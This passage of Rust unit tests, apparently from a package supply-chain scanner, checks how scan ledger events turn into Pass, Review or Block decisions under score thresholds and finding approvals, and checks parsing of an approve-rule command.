                version: Some("1.0.0".to_string()),
                artifact_identity: Some(format!("sha256:{artifact_sha256}")),
                generation: Some("1".to_string()),
                engine_policy_revision: Some("c".repeat(64)),
                ..LedgerIdentity::default()
            },
            Some(chrono::Utc::now()),
            LedgerEventDetails::ScanCompleted(ScanCompletedBody { evidence }),
        )?;
        let policy = supply_core::domain::Policy::default();

        let one_approved =
            artifact_report_from_event(&event, &policy, &BTreeSet::from([approved_id.clone()]))?;
        assert_eq!(one_approved.decision, ScanDecision::Block);
        assert_eq!(one_approved.engines[0].findings.len(), 2);

        let both_approved =
            artifact_report_from_event(&event, &policy, &BTreeSet::from([approved_id, other_id]))?;
        assert_eq!(both_approved.decision, ScanDecision::Pass);
        assert_eq!(both_approved.engines[0].findings.len(), 2);

        let stale_approval =
            artifact_report_from_event(&event, &policy, &BTreeSet::from(["f".repeat(64)]))?;
        assert_eq!(stale_approval.decision, ScanDecision::Block);
        Ok(())
    }
    #[test]
    fn coverage_scan_decision_respects_policy_thresholds() -> Result<()> {
        use supply_core::application::ledger::{
            engine_finding_id, Coverage, EngineFinding, EngineReport, LedgerEvent,
            LedgerEventDetails, LedgerIdentity, LedgerSourceKind, PackageEvidence,
            ScanCompletedBody, ScanDecision,
        };

        let digest = "a".repeat(64);
        let cases = [
            (rust_decimal::Decimal::new(4, 1), ScanDecision::Pass),
            (rust_decimal::Decimal::new(75, 1), ScanDecision::Review),
            (rust_decimal::Decimal::from(8), ScanDecision::Block),
        ];

        for (index, (score, expected)) in cases.into_iter().enumerate() {
            let finding = EngineFinding {
                id: engine_finding_id("guarddog", "script-rule", "package.json", "content")?,
                rule: "script-rule".to_string(),
                summary: "scanner reported a finding".to_string(),
                location: None,
                native_severity: None,
                policy_score: Some(score),
            };
            let engine = EngineReport {
                source: "guarddog".to_string(),
                version: Some("3.2.0".to_string()),
                rule_bundle_sha256: Some("c".repeat(64)),
                database_sha256: None,
                input_sha256: Some(digest.clone()),
                expected_inputs: 1,
                processed_inputs: 1,
                coverage: Coverage::Complete,
                findings: vec![finding],
                reason: None,
            };
            let evidence = PackageEvidence {
                artifact_sha256: Some(digest.clone()),
                coverage: Some(Coverage::Complete),
                score: Some(score.to_string()),
                source_kind: Some(LedgerSourceKind::Scanner),
                engine_reports: vec![engine],
                ..PackageEvidence::default()
            };
            let event = LedgerEvent::new(
                "supply-core",
                LedgerIdentity {
                    observation_id: Some(format!("threshold-case-{index}")),
                    ecosystem: Some(supply_core::domain::Ecosystem::Npm),
                    name: Some("fixture".to_string()),
                    version: Some("1.0.0".to_string()),
                    artifact_identity: Some(format!("sha256:{digest}")),
                    generation: Some("1".to_string()),
                    engine_policy_revision: Some("c".repeat(64)),
                    ..LedgerIdentity::default()
                },
                Some(chrono::Utc::now()),
                LedgerEventDetails::ScanCompleted(ScanCompletedBody { evidence }),
            )?;

            let report = artifact_report_from_event(
                &event,
                &supply_core::domain::Policy::default(),
                &BTreeSet::new(),
            )?;

            assert_eq!(report.decision, expected);
            assert_eq!(report.coverage, Coverage::Complete);
            report.validate()?;
        }

        Ok(())
    }
}
#[cfg(test)]
mod approval_cli_tests {
    use super::*;

    #[test]
    fn approve_rule_accepts_finding_scoped_arguments() {
        let artifact = "a".repeat(64);
        let finding = "b".repeat(64);
        let policy = "c".repeat(64);
        let parsed = Cli::try_parse_from([
            "supply",
            "approve-rule",
            "--artifact-sha256",
            artifact.as_str(),
            "--finding-id",
            finding.as_str(),
            "--policy-sha256",
            policy.as_str(),
            "--expires-at",
            "2030-01-01T00:00:00Z",
            "--reason",
            "reviewed",
        ]);

        assert!(parsed.is_ok());
    }
}
